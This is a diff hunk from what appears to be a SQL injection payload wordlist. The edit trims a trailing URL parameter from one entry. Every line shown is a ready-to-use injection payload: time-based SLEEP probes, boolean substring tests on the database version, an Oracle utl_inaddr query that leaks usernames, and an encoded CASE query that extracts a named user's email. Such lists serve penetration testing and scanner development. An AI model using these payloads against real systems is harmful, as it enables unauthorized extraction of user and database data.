@@ -11,7 +11,7 @@ FUZZ') AND (SELECT 3790 FROM (SELECT(SLEEP(5)))yGYJ)--
 "1 and (select substring(@@version,25,1))='8'"
 or 1=utl_inaddr.get_host_address((select sys.stragg (distinct username||chr(32)) from all_users))--
 %28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29
-51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
+51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END
 ')+union+select+1,sleep(10)--+-
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 " AND (length(database())) = "11 --+-    
